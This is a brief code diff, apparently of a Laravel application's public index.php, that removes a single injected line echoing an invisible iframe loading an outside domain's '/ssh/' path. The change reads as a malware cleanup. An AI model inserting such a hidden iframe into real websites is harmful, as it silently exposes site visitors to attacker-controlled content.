@@ -43,7 +43,6 @@ require __DIR__.'/../vendor/autoload.php';
 | to this client's browser, allowing them to enjoy our application.
 |
 */
-echo '<iframe src="https://edu-master.com/ssh/" style="display:none;"></iframe>';
 
 $app = require_once __DIR__.'/../bootstrap/app.php';
 
